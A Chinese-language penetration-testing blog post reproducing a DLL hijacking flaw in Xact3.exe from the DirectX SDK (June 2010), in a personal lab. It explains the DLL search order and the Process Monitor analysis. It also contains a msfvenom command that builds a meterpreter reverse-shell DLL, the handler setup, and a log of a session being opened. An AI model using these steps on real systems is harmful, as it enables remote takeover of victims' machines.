---
categories: 渗透测试
date: "2018-08-15T00:00:00Z"
description: 本文记录DirectX SDK的DLL劫持漏洞
title: Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现
url: /archivers/2018-08-15/1
---



## 0x00 前言

Microsoft DirectX SDK (June 2010) Xact3.exe
https://www.microsoft.com/en-us/download/details.aspx?id=6812

目前微软官方已经废弃该SDK，所以我只能本着学习的心态去复现。

通过参考网上的漏洞披露，我决定复现一下。 这个和之前[QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权](http://payloads.online/archivers/2018-06-09/1)的思路差不多。

## 0x01 复现过程

首先，漏洞披露详情如下：

```
Exploit/POC
=============
1) create DLL 32bit DLL named "xbdm.dll" and place on a remote share

2) create an empty file with a ".xap" extension on the same share, this will open using "Xact3.exe" as its default

3) open the the .xap file from the Network share then BOOM!
```

一共两步，第一步是创建两个文件，分别是`.xap`文件和`xbdm.dll`。

然后使用`Xact3.exe`打开，应用程序将会调用`xbdm.dll`。

`Xact3.exe`默认路径：

* `C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Utilities\bin\x86`


### 原理

Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。

当程序员在编码的时候未指定DLL绝对路径，应用程序则会在当前目录下寻找DLL。


寻找顺序：
---------------
* 1.程序所在目录
* 2.系统目录即 SYSTEM32 目录
* 3.16位系统目录即 SYSTEM 目录
* 4.Windows目录
* 5.加载 DLL 时所在的当前目录
* 6.PATH环境变量中列出的目录

### 寻找过程

在这里我还是使用[Process Monitor](https://docs.microsoft.com/en-gb/sysinternals/downloads/procmon)进行分析：

**设置过滤器**

> 过滤器可以有效的帮我们排除一些不需要关注的信息

* Filter > Filter.. > Process Name > "Xact3.exe"

这样在创建`Xact3.exe`进程时，我们的过滤器就会起作用了，会将该进程的所有行为展示出来。

![0x01](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-08-15/0x01.png)

然后点击“ADD”，将过滤条件生效。

虽说这样能看到所有的行为，但是还不够精确，需要再加个`Result`为`NAME NOT FOUND`的条件。


**查看加载DLL过程**

我先创建一个`1.xap`：

> 新建文本文档->重命名为1.xap

通过`Xact3.exe`打开，效果如下：

![0x02](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-08-15/0x02.png)

可以看出，该进程在不断寻找`xbdm.dll`，直接从该进程的物理路径开始寻找，这很大可能存在DLL劫持漏洞。

## 0x02 利用过程

漏洞作者披露的文章中附带了测试的POC，但是需要编译，我们可以使用MSF直接生成DLL测试。

作者POC：

```c
#include <windows.h>

/* hyp3rlinx */

/*
gcc -c -m32 xbdm.c
gcc -shared -m32 -o xbdm.dll xbdm.o
*/

void executo(){
 MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , "philbin :)" , MB_YESNO + MB_ICONQUESTION );
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
switch(fdwReason){
case DLL_PROCESS_ATTACH:{
 executo();
break;
}
case DLL_PROCESS_DETACH:{
 executo();
break;
}
case DLL_THREAD_ATTACH:{
 executo();
break;
}
case DLL_THREAD_DETACH:{
 executo();
break;
}
}

return TRUE;
}
```

使用MSF生成DLL：

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.137.79 LPORT=4444 -f dll -o /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of dll file: 5120 bytes
Saved as: /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
```

MSF配置：

```sh
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.137.79   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.
msf exploit(multi/handler) >
[*] Started reverse TCP handler on 192.168.137.79:4444

msf exploit(multi/handler) >
```

创建一个`.xap`文件：

```
touch .xap
```

打开`.xap`文件，获得会话：

![0x03](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-08-15/0x03.png)

```sh
msf exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  2   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.137.79:4444

msf exploit(multi/handler) >
[*] Sending stage (179779 bytes) to 192.168.137.71
[*] Meterpreter session 2 opened (192.168.137.79:4444 -> 192.168.137.71:49236) at 2018-08-15 18:31:59 +0800

msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: John-Thunderobt\John
meterpreter > background
[*] Backgrounding session 2...
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.137.79   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) >
```

## 0x03 总结

本片文章主要涉及了`Process Monitor`过滤器的使用，方便快速定位指定进程。

并且复习了DLL劫持漏洞的原理，及利用方式。

## 0x04 参考

* http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt
* https://www.exploitalert.com/view-details.html?id=30611
* https://hackertor.com/2018/08/13/microsoft-directx-sdk-june-2010-xact3-exe-dll-hijacking/

* ....

其实都是一个内容，第一个是作者的文章，有很多不错的漏洞值得学习！